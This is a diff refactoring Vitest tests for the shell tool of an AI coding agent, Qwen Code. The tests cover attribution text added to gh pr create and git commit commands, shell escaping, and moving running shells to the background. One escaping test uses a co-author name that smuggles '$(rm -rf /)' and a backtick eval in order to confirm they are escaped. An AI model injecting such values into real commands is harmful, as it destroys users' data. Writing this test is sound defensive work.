-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.not.stringContaining('Generated with Qwen Code'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
         );
       });
 
@@ -6981,148 +4053,46 @@ describe('ShellTool', () => {
           email: 'qwen-coder@alibabacloud.com',
         });
 
-        const command = 'gh pr create --title "x" --body "Summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
+        await runPr('gh pr create --title "x" --body "Summary"');
 
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
-        );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.not.stringContaining('Generated with Qwen Code'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
+        expectSpawned(expect.not.stringContaining(ATTRIBUTION));
       });
 
-      // Without escaping, a generator name containing `"`, `$`, or a
-      // backtick would either break the user-approved `gh pr create`
-      // command or be evaluated as command substitution. The fix was to
-      // shell-escape the appended text for the surrounding quote style.
+      // An unescaped `"`, `$` or backtick in the generator name would break
+      // the approved `gh pr create` or run as command substitution; the fix
+      // shell-escapes the appended text for the surrounding quote style.
       it('should escape generator names with shell metacharacters in double-quoted body', async () => {
-        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
-          commit: true,
-          pr: true,
-          // A name designed to break double-quote interpolation if not escaped.
-          name: 'Bot $(rm -rf /) "danger" `eval`',
-          email: 'bot@example.com',
-        });
-        // Generator name only ends up in the attribution when shots > 0.
-        const svc = CommitAttributionService.getInstance();
-        svc.incrementPromptCount();
+        setCoAuthor('Bot $(rm -rf /) "danger" `eval`');
+        // The generator name only reaches the attribution when shots > 0.
+        CommitAttributionService.getInstance().incrementPromptCount();
 
-        const command = 'gh pr create --title "x" --body "Summary"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
+        const observedCmd = await runPr(
+          'gh pr create --title "x" --body "Summary"',
         );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observedCmd = mockShellExecutionService.mock.calls[0][0];
-        // Each metacharacter must be escaped, not literal.
-        expect(observedCmd).toContain('\\$');
-        expect(observedCmd).toContain('\\"');
-        expect(observedCmd).toContain('\\`');
-        // And the original `--body` quote must still close properly
-        // (`s` flag — body contains newlines from the attribution).
+        // Each metacharacter is escaped, and the `--body` quote still closes
+        // (`s` flag: the attribution adds newlines).
+        expectText(observedCmd, ['\\$', '\\"', '\\`']);
         expect(observedCmd).toMatch(/--body\s+".+"/s);
       });
 
       it('should escape single-quoted body containing apostrophes in generator name', async () => {
-        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
-          commit: true,
-          pr: true,
-          name: "O'Brien-Bot",
-          email: 'bot@example.com',
-        });
-        const svc = CommitAttributionService.getInstance();
-        svc.incrementPromptCount();
+        setCoAuthor("O'Brien-Bot");
+        CommitAttributionService.getInstance().incrementPromptCount();
 
-        const command = "gh pr create --title 'x' --body 'Summary'";
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
+        const observedCmd = await runPr(
+          "gh pr create --title 'x' --body 'Summary'",
         );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observedCmd = mockShellExecutionService.mock.calls[0][0];
         // The bash close-escape-reopen trick yields `'\''` in place of `'`.
         expect(observedCmd).toContain("O'\\''Brien-Bot");
       });
 
-      // A body that already uses bash's `'\''` apostrophe-escape form
-      // should be matched as a single complete argument so the trailer
-      // appends after the full body, not after the first quote-segment.
+      // A body already in bash's `'\''` form is one argument: the attribution
+      // appends after the full body, not after the first quote segment.
       it("should match the full body across '\\\\'' apostrophe escapes", async () => {
-        const command = "gh pr create --title 'x' --body 'don'\\''t break me'";
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        await vi.waitFor(() =>
-          expect(mockShellExecutionService).toHaveBeenCalled(),
+        const observed = await runPr(
+          "gh pr create --title 'x' --body 'don'\\''t break me'",
         );
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0];
-        // The original body content is preserved end-to-end.
         expect(observed).toContain("don'\\''t break me");
-        // The attribution lands AFTER the original body, not in the
-        // middle of it.
         expect(observed).toMatch(
           /don'\\''t break me[\s\S]*Generated with Qwen Code/,
         );
@@ -7131,28 +4101,12 @@ describe('ShellTool', () => {
 
     describe('foreground → background promote (#3831 PR-2)', () => {
       it("exposes a promote AbortController whose signal is wired into ShellExecutionService.execute's combined signal", async () => {
-        // Pin the operational guarantee: aborting the controller exposed
-        // via `setPromoteAbortControllerCallback` must actually reach
-        // `ShellExecutionService` — the bare "controller is an
-        // AbortController instance" assertion would still pass if
-        // `shell.ts` exposed the controller but forgot to include
-        // `promoteAbortController.signal` in `AbortSignal.any(...)`,
-        // silently breaking the future Ctrl+B keybind.
-        const setPromoteAc = vi.fn();
-        const invocation = shellTool.build({
-          command: 'npm run dev',
-          is_background: false,
-        });
-        // Cast to the concrete invocation type to access the extra
-        // ShellTool-specific execute() params (setPidCallback +
-        // setPromoteAbortControllerCallback) — the base ToolInvocation
-        // type only has the 3-param signature shared across all tools.
-        const promise = (invocation as ShellToolInvocation).execute(
-          mockAbortSignal,
-          undefined,
-          {},
-          undefined,
-          setPromoteAc,
+        // Aborting the controller from `setPromoteAbortControllerCallback`
+        // must reach the service: instanceof alone passes if shell.ts omits
+        // `promoteAbortController.signal` from `AbortSignal.any(...)`, silently
+        // breaking the Ctrl+B keybind.
+        const { promise, setPromoteAc } = executeWithPromote(
+          build('npm run dev'),
         );
         resolveShellExecution({ pid: 12345 });
         await promise;
@@ -7161,9 +4115,7 @@ describe('ShellTool', () => {
         const passedAc = setPromoteAc.mock.calls[0][0] as AbortController;
         expect(passedAc).toBeInstanceOf(AbortController);
 
-        // Capture the AbortSignal handed to ShellExecutionService.execute
-        // (4th arg per the call signature) and verify firing the promote
-        // controller propagates through it.
+        // The signal handed to the service (4th arg) follows the controller.
         const passedSignal = mockShellExecutionService.mock
           .calls[0][3] as AbortSignal;
         expect(passedSignal.aborted).toBe(false);
@@ -7172,14 +4124,9 @@ describe('ShellTool', () => {
       });
 
       it('registers a bg_xxx entry on `result.promoted: true` and returns promote-flavored ToolResult', async () => {
-        const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
-        writeFileSyncSpy.mockReturnValue(undefined);
-        const registry = mockConfig.getBackgroundShellRegistry();
-        const invocation = shellTool.build({
-          command: 'tail -f /tmp/never.log',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
+        const promise = build('tail -f /tmp/never.log').execute(
+          mockAbortSignal,
+        );
         // Service signals promote: snapshot ready, child still alive.
         resolveShellExecution({
           output: 'partial output before promote',
@@ -7193,7 +4140,7 @@ describe('ShellTool', () => {
 
         // Entry registered with the spawn pid + promote AbortController.
         expect(registry.register).toHaveBeenCalledTimes(1);
-        const entry = (registry.register as Mock).mock.calls[0][0];
+        const entry = registeredEntry();
         expect(entry.command).toBe('tail -f /tmp/never.log');
         expect(entry.cwd).toBe('/test/dir');
         expect(entry.status).toBe('running');
@@ -7202,9 +4149,8 @@ describe('ShellTool', () => {
         expect(entry.outputPath).toContain(entry.shellId);
         expect(entry.abortController).toBeInstanceOf(AbortController);
 
-        // Snapshot written to the output stream (PR-2.5: snapshot +
-        // post-promote bytes now share a single append-mode stream
-        // instead of the prior writeFileSync snapshot-only path).
+        // PR-2.5: snapshot + post-promote bytes share one stream (formerly a
+        // writeFileSync snapshot-only path).
         expect(fs.createWriteStream).toHaveBeenCalledWith(entry.outputPath, {
           flags: 'w',
         });
@@ -7214,378 +4160,233 @@ describe('ShellTool', () => {
           'partial output before promote',
         );
 
-        // Model-facing copy points at /tasks / dialog / task_stop.
-        expect(result.llmContent).toContain(
+        // Model copy points at /tasks / dialog / task_stop and (#7626) teaches
+        // executeBackground's status-file liveness heuristic, unbuffering hint
+        // included, so the copies cannot drift.
+        expectText(result.llmContent, [
           `promoted to background as ${entry.shellId}`,
-        );
-        expect(result.llmContent).toContain(`PID: 99999`);
-        expect(result.llmContent).toContain('/tasks');
-        expect(result.llmContent).toContain(
+          `PID: 99999`,
+          '/tasks',
           `task_stop({ task_id: '${entry.shellId}'`,
-        );
-        // #7626: the promoted path must teach the same status-file
-        // liveness heuristic as executeBackground — including the
-        // actionable unbuffering hint, so the two copies cannot drift.
-        expect(result.llmContent).toContain(
           `status file: ${entry.outputPath.replace(/\.output$/, '.status')}`,
-        );
-        expect(result.llmContent).toContain(
           'Do NOT infer liveness from the output file',
-        );
-        expect(result.llmContent).toContain('python -u');
-        expect(result.llmContent).toContain('stdbuf -oL');
-        expect(result.returnDisplay).toContain(
+          'python -u',
+          'stdbuf -oL',
+        ]);
+        expect(shellResultText(result.returnDisplay)).toContain(
           `Promoted to background: ${entry.shellId}`,
         );
-        // No `error` on the result — promote is a success-shaped outcome
-        // per #3831 design question 7 / @tanzhenxin's PR-1 review.
+        // No `error`: promote is success-shaped (#3831 design question 7 /
+        // @tanzhenxin's PR-1 review).
         expect(result.error).toBeUndefined();
       });
 
       it('aborting entry.abortController kills the child via SIGTERM/SIGKILL and marks the registry entry cancelled', async () => {
-        // Pin the core operational guarantee for promoted shells:
-        // `task_stop bg_xxx` (which goes through
-        // `registry.requestCancel` → `entry.abortController.abort()`)
-        // must actually stop the child + transition the entry to
-        // `'cancelled'`. The bare "fresh controller" check below
-        // doesn't exercise the full kill path.
-        vi.useFakeTimers();
-        const processKillSpy = vi
-          .spyOn(process, 'kill')
-          .mockImplementation(() => true);
-        try {
-          const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
-          writeFileSyncSpy.mockReturnValue(undefined);
-          const registry = mockConfig.getBackgroundShellRegistry();
-          const invocation = shellTool.build({
-            command: 'tail -f /tmp/never.log',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({
-            output: '',
-            exitCode: null,
-            signal: null,
-            aborted: false,
-            promoted: true,
-            pid: 55555,
-          });
-          await promise;
+        // `task_stop bg_xxx` (`registry.requestCancel` →
+        // `entry.abortController.abort()`) must kill the child and mark the
+        // entry 'cancelled'; the fresh-controller check doesn't cover killing.
+        fakeTimers();
+        const processKillSpy = spyKill();
+        await runPromoted('tail -f /tmp/never.log', 55555);
 
-          const entry = (registry.register as Mock).mock.calls[0][0];
-          // Trigger the cancellation path the way `task_stop` does.
-          entry.abortController.abort();
-          // Sync part of cancelChild runs as a microtask after abort:
-          // SIGTERM is dispatched, then the listener awaits a 200ms
-          // timer before SIGKILL + registry.cancel. Flush microtasks +
-          // advance fake time past the SIGKILL window.
-          await Promise.resolve();
-          expect(processKillSpy).toHaveBeenCalledWith(-55555, 'SIGTERM');
-          // Advance past PROMOTE_CANCEL_SIGKILL_TIMEOUT_MS (200ms).
-          await vi.advanceTimersByTimeAsync(250);
-          expect(processKillSpy).toHaveBeenCalledWith(-55555, 'SIGKILL');
-          // Registry entry transitions to 'cancelled' synchronously
-          // after SIGKILL — so /tasks reflects user intent without
-          // waiting for the (non-existent) settle path.
-          expect(registry.cancel).toHaveBeenCalledWith(
-            entry.shellId,
-            expect.any(Number),
-          );
-        } finally {
-          processKillSpy.mockRestore();
-          vi.useRealTimers();
-        }
+        const entry = registeredEntry();
+        entry.abortController.abort();
+        // cancelChild sends SIGTERM in a microtask, then SIGKILL + cancel after
+        // PROMOTE_CANCEL_SIGKILL_TIMEOUT_MS (200ms).
+        await Promise.resolve();
+        expect(processKillSpy).toHaveBeenCalledWith(-55555, 'SIGTERM');
+        await vi.advanceTimersByTimeAsync(250);
+        expect(processKillSpy).toHaveBeenCalledWith(-55555, 'SIGKILL');
+        // 'cancelled' right after SIGKILL, so /tasks reflects user intent
+        // without waiting for the (non-existent) settle path.
+        expect(registry.cancel).toHaveBeenCalledWith(
+          entry.shellId,
+          expect.any(Number),
+        );
       });
 
       it("entry.abortController is a FRESH controller (not the already-aborted promote controller) so task_stop's abort() actually fires kill listeners", async () => {
-        // Real-bug regression: if `entry.abortController` were the
-        // same `promoteAbortController` that triggered the promote,
-        // it would already be in the `aborted: true` state by the time
-        // it landed in the registry. `task_stop bg_xxx` calls
-        // `entry.abortController.abort()` which is a no-op on an
-        // already-aborted controller, AND `ShellExecutionService` has
-        // detached its abort listener as part of the promote handoff,
-        // so the still-running child would survive task_stop forever.
-        // Pin: entry.abortController.signal.aborted === false at
-        // registration.
-        const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
-        writeFileSyncSpy.mockReturnValue(undefined);
-        const registry = mockConfig.getBackgroundShellRegistry();
-        const invocation = shellTool.build({
-          command: 'tail -f /tmp/never.log',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({
-          output: '',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 77777,
-        });
-        await promise;
+        // Real-bug regression: reusing the `promoteAbortController` that
+        // triggered the promote registers it already aborted, so task_stop's
+        // `abort()` is a no-op; with the service's listener detached by the
+        // handoff, the child would survive task_stop forever.
+        await runPromoted('tail -f /tmp/never.log', 77777);
 
-        const entry = (registry.register as Mock).mock.calls[0][0];
-        expect(entry.abortController.signal.aborted).toBe(false);
+        expect(registeredEntry().abortController.signal.aborted).toBe(false);
       });
 
       it('survives a snapshot write failure — registry entry still registered', async () => {
-        const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
-        writeFileSyncSpy.mockImplementation(() => {
+        vi.mocked(fs.writeFileSync).mockImplementation(() => {
           throw new Error('ENOSPC: no space left on device');
         });
-        const registry = mockConfig.getBackgroundShellRegistry();
-        const invocation = shellTool.build({
-          command: 'tail -f /tmp/never.log',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({
-          output: 'pre-promote',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 88888,
-        });
-        const result = await promise;
+        const result = await runPromoted(
+          'tail -f /tmp/never.log',
+          88888,
+          'pre-promote',
+        );
 
-        // The disk write failure is logged + swallowed: the entry is
-        // still valuable on its own; the file is the inspection
-        // surface, not the source of truth.
+        // The write failure is logged + swallowed: the entry is useful on its
+        // own; the file is the inspection surface, not the source of truth.
         expect(registry.register).toHaveBeenCalledTimes(1);
         expect(result.llmContent).toContain('promoted to background');
       });
 
       it('entry.command holds the post-co-author-rewrite form (commandToExecute), not raw params.command', async () => {
-        // #3894 review: previously `entry.command` used
-        // `this.params.command`, which diverges from what actually ran
-        // for `git commit -m` invocations that
-        // `addCoAuthorToGitCommit()` rewrote into a multi-line form
-        // with `-m "Co-Authored-By: …"`. Pin: registered entry MUST
-        // mirror the post-rewrite command so /tasks shows what the OS
-        // actually executed.
-        const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
-        writeFileSyncSpy.mockReturnValue(undefined);
-        const registry = mockConfig.getBackgroundShellRegistry();
+        // #3894 review: `entry.command` used `this.params.command`, diverging
+        // from what ran once addCoAuthorToGitCommit() rewrote a `git commit -m`;
+        // /tasks must show what the OS actually executed.
         const rawCommand = 'git commit -m "feat: ship promote"';
-        const invocation = shellTool.build({
-          command: rawCommand,
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({
-          output: '',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 33333,
-        });
-        const result = await promise;
+        const result = await runPromoted(rawCommand, 33333);
 
-        // The actual command passed to ShellExecutionService.execute is
-        // the post-rewrite form — capture it from the service mock.
         const commandPassedToService = mockShellExecutionService.mock
           .calls[0][0] as string;
         expect(commandPassedToService).not.toBe(rawCommand); // sanity: rewrite happened
         expect(commandPassedToService).toContain('Co-authored-by');
 
-        const entry = (registry.register as Mock).mock.calls[0][0];
+        const entry = registeredEntry();
         expect(entry.command).toBe(commandPassedToService);
         expect(entry.command).not.toBe(rawCommand);
-
-        // llmContent also references the post-rewrite form so the
-        // model sees consistent state.
+        // llmContent references the same form, so the model sees consistent state.
         expect(result.llmContent).toContain(commandPassedToService);
       });
 
       it('rethrows + kills child when mkdirSync(outputDir) throws — no orphan zombie', async () => {
-        // @tanzhenxin's review on #3894: mkdirSync ran before any
-        // try/catch, so an unwritable output dir (read-only mount,
-        // sandbox perms, ENOSPC on metadata) rejected the handler
-        // BEFORE the registry's kill listener was wired — the still-
-        // running child became an orphan with no kill path until the
-        // OS reaped it on session end. Pin the regression: mkdir-throw
-        // is re-raised AND the child gets SIGTERM right away.
-        const processKillSpy = vi
-          .spyOn(process, 'kill')
-          .mockImplementation(() => true);
-        const mkdirSyncSpy = vi.mocked(fs.mkdirSync);
-        try {
-          mkdirSyncSpy.mockImplementation(() => {
-            throw new Error('EROFS: read-only file system');
-          });
-          const invocation = shellTool.build({
-            command: 'tail -f /tmp/never.log',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({
-            output: '',
-            exitCode: null,
-            signal: null,
-            aborted: false,
-            promoted: true,
-            pid: 22222,
-          });
+        // @tanzhenxin's review on #3894: mkdirSync ran before any try/catch, so
+        // an unwritable output dir (read-only mount, sandbox perms, ENOSPC on
+        // metadata) rejected before the kill listener was wired, orphaning the
+        // child until session end. Now: re-raised AND SIGTERM right away.
+        const processKillSpy = spyKill();
+        vi.mocked(fs.mkdirSync).mockImplementation(() => {
+          throw new Error('EROFS: read-only file system');
+        });
 
-          await expect(promise).rejects.toThrow('EROFS');
-          // SIGTERM is sync after the throw — no fake timers needed.
-          expect(processKillSpy).toHaveBeenCalledWith(-22222, 'SIGTERM');
-        } finally {
-          mkdirSyncSpy.mockReturnValue(undefined);
-          processKillSpy.mockRestore();
-        }
+        await expect(
+          runPromoted('tail -f /tmp/never.log', 22222),
+        ).rejects.toThrow('EROFS');
+        // SIGTERM is sync after the throw — no fake timers needed.
+        expect(processKillSpy).toHaveBeenCalledWith(-22222, 'SIGTERM');
       });
 
       it('promote-refused race (aborted: true, promoted: false after promote signal) is reported as benign race, not "Command timed out"', async () => {
-        // @tanzhenxin's review on #3894: when PR-3's Ctrl+B keybind
-        // fires `promoteAbortController.abort` but the service's race
-        // guard refuses promotion (the child terminated a beat
-        // earlier), the result lands `aborted: true, promoted: false`.
-        // Without excluding the promote signal from the timeout
-        // discriminator, the foreground path falsely reports
-        // "Command timed out" for a process that finished naturally.
-        const setPromoteAc = vi.fn();
-        const invocation = shellTool.build({
-          command: 'sleep 1',
-          is_background: false,
-        });
-        const promise = (invocation as ShellToolInvocation).execute(
-          mockAbortSignal,
-          undefined,
-          {},
-          undefined,
-          setPromoteAc,
-        );
-        // Capture the promote AC the foreground path exposes.
+        // @tanzhenxin's review on #3894: Ctrl+B (PR-3) can fire the promote
+        // abort just after the child ended; the race guard refuses, giving
+        // `aborted: true, promoted: false`. Unless the promote signal is left
+        // out of the timeout discriminator, that reads "Command timed out".
+        const { promise, setPromoteAc } = executeWithPromote(build('sleep 1'));
         await Promise.resolve();
         const promoteAc = setPromoteAc.mock.calls[0]?.[0] as
           | AbortController
           | undefined;
         expect(promoteAc).toBeInstanceOf(AbortController);
-        // Fire promote AFTER the child supposedly terminated — the
-        // service refuses with `aborted: true, promoted: false`.
         promoteAc!.abort({ kind: 'background', shellId: 'bg_late' });
         resolveShellExecution({
           output: 'oops too late\n',
           exitCode: null,
-          signal: null,
           aborted: true,
           promoted: false,
           pid: 33333,
         });
         const result = await promise;
 
-        // Must NOT say "timed out" — the child finished naturally.
-        expect(String(result.llmContent)).not.toContain('timed out');
-        // Should explain the benign race so the agent doesn't retry as
-        // a cancellation/timeout.
-        expect(String(result.llmContent)).toContain(
-          'Command finished before the background-promote',
+        // Not "timed out": the benign race is explained so the agent doesn't
+        // retry it as a cancellation/timeout, and the output is preserved.
+        expectText(
+          String(result.llmContent),
+          ['Command finished before the background-promote', 'oops too late'],
+          ['timed out'],
         );
-        // Captured output is preserved.
-        expect(String(result.llmContent)).toContain('oops too late');
+        expect(result.returnDisplay).toMatchObject({ outcome: 'completed' });
       });
 
       it('rethrows + kills child when registry.register throws — no orphan zombie', async () => {
-        // #3894 review: today `BackgroundShellRegistry.register` is
-        // internally safe (Map.set + emit) but if a future
-        // implementation throws, the promoted child is already
-        // detached from the service's listeners and would become an
-        // orphan zombie with no kill path. Pin: register-throw is
-        // re-raised AND the child gets SIGTERM (best-effort kill via
-        // the entry's abort listener).
-        vi.useFakeTimers();
-        const processKillSpy = vi
-          .spyOn(process, 'kill')
-          .mockImplementation(() => true);
-        try {
-          const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
-          writeFileSyncSpy.mockReturnValue(undefined);
-          const registry = mockConfig.getBackgroundShellRegistry();
-          (registry.register as Mock).mockImplementation(() => {
-            throw new Error('boom: registry borked');
-          });
-          const invocation = shellTool.build({
-            command: 'tail -f /tmp/never.log',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({
-            output: '',
-            exitCode: null,
-            signal: null,
-            aborted: false,
-            promoted: true,
-            pid: 44444,
-          });
+        // #3894 review: register is internally safe today (Map.set + emit),
+        // but a throwing implementation would orphan the already-detached
+        // child. The throw is re-raised AND the child gets SIGTERM via the
+        // entry's abort listener.
+        fakeTimers();
+        const processKillSpy = spyKill();
+        registry.register.mockImplementation(() => {
+          throw new Error('boom: registry borked');
+        });
 
-          // Re-thrown to caller (scheduler will surface as tool error).
-          await expect(promise).rejects.toThrow('boom: registry borked');
+        // Re-thrown to the caller (the scheduler surfaces it as a tool error).
+        await expect(
+          runPromoted('tail -f /tmp/never.log', 44444),
+        ).rejects.toThrow('boom: registry borked');
 
-          // The catch path fired entryAc.abort() → cancelChild → SIGTERM.
-          await Promise.resolve();
-          expect(processKillSpy).toHaveBeenCalledWith(-44444, 'SIGTERM');
-          // SIGKILL fires after the 200ms timer; advance + assert.
-          await vi.advanceTimersByTimeAsync(250);
-          expect(processKillSpy).toHaveBeenCalledWith(-44444, 'SIGKILL');
-        } finally {
-          processKillSpy.mockRestore();
-          vi.useRealTimers();
-        }
+        // The catch path fired entryAc.abort() → cancelChild → SIGTERM, then
+        // SIGKILL after the 200ms timer.
+        await Promise.resolve();
+        expect(processKillSpy).toHaveBeenCalledWith(-44444, 'SIGTERM');
+        await vi.advanceTimersByTimeAsync(250);
+        expect(processKillSpy).toHaveBeenCalledWith(-44444, 'SIGKILL');
       });
     });
 
     describe('foreground → background promote PR-2.5 (post-promote stream + natural-exit settle)', () => {
-      it('post-promote bytes APPEND to bg_xxx.output via write stream (do NOT overwrite snapshot)', async () => {
-        // Pin the PR-2.5 stream-redirect contract: snapshot lands
-        // first, post-promote chunks flow through `stream.write` in
-        // FIFO order. Without this PR the file was frozen at promote
-        // time and live updates never reached /tasks.
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn(),
-          // PR-2.5: settle path uses `once('finish', ...)` to wait
-          // for the stream flush before transitioning the registry.
-          // Default impl: immediately invoke the handler so the test
-          // doesn't hang waiting for an event the mocked stream
-          // never emits naturally.
-          once: vi.fn((event: string, handler: () => void) => {
-            if (event === 'finish') handler();
-          }),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
-        const registry = mockConfig.getBackgroundShellRegistry();
-        const invocation = shellTool.build({
-          command: 'tail -f /tmp/never.log',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        // Service resolves promoted with snapshot.
-        resolveShellExecution({
-          output: 'initial-snapshot',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 11111,
-        });
-        await promise;
+      type SettleInfo = Parameters<Required<PostPromote>['onSettle']>[0];
 
-        const entry = (registry.register as Mock).mock.calls[0][0];
-        // Stream opened in overwrite mode at promote time so a stale
-        // file under the same shellId (vanishingly unlikely given
-        // randomBytes) starts fresh.
-        expect(fs.createWriteStream).toHaveBeenCalledWith(entry.outputPath, {
-          flags: 'w',
+      /** A settle event: exit `exitCode` (no signal by default) at `endTime`. */
+      const settled = (
+        endTime: number,
+        exitCode: number | null = 0,
+        signal: SettleInfo['signal'] = null,
+      ): SettleInfo => ({ exitCode, signal, endTime });
+
+      /** Makes the next spawn promote with the child already settled, before the promote resolves. */
+      const mockSettledSpawn = (
+        pid: number,
+        output: string,
+        endTime: number,
+        exitCode = 0,
+      ) =>
+        mockPromotedSpawn(pid, output, (postPromote) =>
+          postPromote?.onSettle?.(settled(endTime, exitCode)),
+        );
+
+      /** Asserts the registered entry completed (exit 0) at `endTime`. */
+      const expectCompleted = (endTime: number) =>
+        expect(registry.complete).toHaveBeenCalledWith(
+          registeredEntry().shellId,
+          0,
+          endTime,
+        );
+
+      /** Asserts the model copy reports the child as already exited with `status`. */
+      const expectExitedCopy = (result: ToolResult, status: string) =>
+        expectText(
+          result.llmContent,
+          [`Status: ${status}.`, 'already exited'],
+          ['Status: running.', 'task_stop({'],
+        );
+
+      /** Installs a stream whose 'error' listeners are captured and whose 'finish' never fires. */
+      const installErroringStream = () => {
+        const errorListeners: Array<(err: Error) => void> = [];
+        installWriteStream({
+          on: vi.fn((event: string, handler: (err: Error) => void) => {
+            if (event === 'error') errorListeners.push(handler);
+          }),
+          once: vi.fn(),
         });
-        // Snapshot written first.
+        return errorListeners;
+      };
+      const diskFull = () =>
+        Object.assign(new Error('disk full'), { code: 'ENOSPC' });
+
+      it('post-promote bytes APPEND to bg_xxx.output via write stream (do NOT overwrite snapshot)', async () => {
+        // PR-2.5 stream redirect: the snapshot lands first, post-promote chunks
+        // follow through `stream.write` in FIFO order. Before, the file froze
+        // at promote time and live updates never reached /tasks.
+        const writeStreamMock = installWriteStream();
+        await runPromoted('tail -f /tmp/never.log', 11111, 'initial-snapshot');
+
+        // Opened in overwrite mode, so a stale file under the same shellId
+        // (vanishingly unlikely given randomBytes) starts fresh.
+        expect(fs.createWriteStream).toHaveBeenCalledWith(
+          registeredEntry().outputPath,
+          { flags: 'w' },
+        );
         expect(writeStreamMock.write).toHaveBeenNthCalledWith(
           1,
           'initial-snapshot',
@@ -7593,131 +4394,41 @@ describe('ShellTool', () => {
       });
 
       it('clean PTY exit transitions the registry entry to "completed" (exitCode 0, signal 0)', async () => {
-        // Pin the PR-2.5 settle path: after promote, when the
-        // service's post-promote exit listener fires with exitCode=0 and
-        // node-pty's clean-exit signal=0,
-        // `registry.complete(shellId, 0, ...)` is called and the
-        // stream closes.
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn(),
-          // PR-2.5: settle path uses `once('finish', ...)` to wait
-          // for the stream flush before transitioning the registry.
-          // Default impl: immediately invoke the handler so the test
-          // doesn't hang waiting for an event the mocked stream
-          // never emits naturally.
-          once: vi.fn((event: string, handler: () => void) => {
-            if (event === 'finish') handler();
-          }),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
-        const registry = mockConfig.getBackgroundShellRegistry();
-        // Capture the postPromote options passed to the service so
-        // we can drive its onSettle handler directly (the mocked
-        // service doesn't fire it on its own).
-        const invocation = shellTool.build({
-          command: 'sleep 1',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({
-          output: '',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 22222,
-        });
-        await promise;
+        // PR-2.5 settle path: an exit (0, node-pty's clean signal 0) runs
+        // `registry.complete(shellId, 0, ...)` and closes the stream. The mocked
+        // service never fires onSettle, so the test drives it.
+        const writeStreamMock = installWriteStream();
+        await runPromoted('sleep 1', 22222);
 
-        // Pull the postPromote options from the service mock's last
-        // call (foreground execute always passes it post-PR-2.5).
-        const serviceCall = mockShellExecutionService.mock.calls[0];
-        const opts = serviceCall[6] as {
-          postPromote?: {
-            onSettle?: (info: {
-              exitCode: number | null;
-              signal: number | NodeJS.Signals | null;
-              error?: Error;
-              endTime: number;
-            }) => void;
-          };
+        // Foreground execute always passes postPromote (post-PR-2.5).
+        const opts = mockShellExecutionService.mock.calls[0][6] as {
+          postPromote?: PostPromote;
         };
         expect(opts?.postPromote?.onSettle).toBeDefined();
-        opts.postPromote!.onSettle!({
-          exitCode: 0,
-          signal: 0,
-          endTime: 1700000000000,
-        });
+        opts.postPromote!.onSettle!(settled(1700000000000, 0, 0));
 
